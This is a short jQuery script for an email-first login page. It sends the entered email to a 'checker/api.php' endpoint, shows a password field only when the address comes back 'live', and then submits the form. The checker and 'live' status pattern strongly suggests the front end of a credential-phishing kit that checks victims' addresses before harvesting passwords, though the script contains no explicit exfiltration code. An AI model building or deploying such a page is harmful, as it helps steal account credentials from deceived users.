$(document).ready(function() {
    $('#login_passworddiv').hide();
    $('#invalid').hide();
});
    var is_vali;
    $('button').on("click", function(){
        if($('#login_passworddiv').css('display') === "none"){
            $('.transitioning').show();
            fetch('checker/api.php?email='+$("#email").val())
            .then(resp => resp.json())
            .then(data => {
                if (data.status === 'live') {
                    is_vali = true;
                    $('#login_emaildiv').fadeOut(50);
                    $('#login_passworddiv').fadeIn(50);
                    $('#invalid').hide();
                    $('.transitioning').hide();
                } else {
                    is_vali = false;
                    $("#login_emaildiv").addClass("error");
                    $('#invalid').show();
                    $('.transitioning').hide();
                }
            }).catch (err => {
                console.error(err);
            });
        }else{
            $("form").submit();
        }
        
    })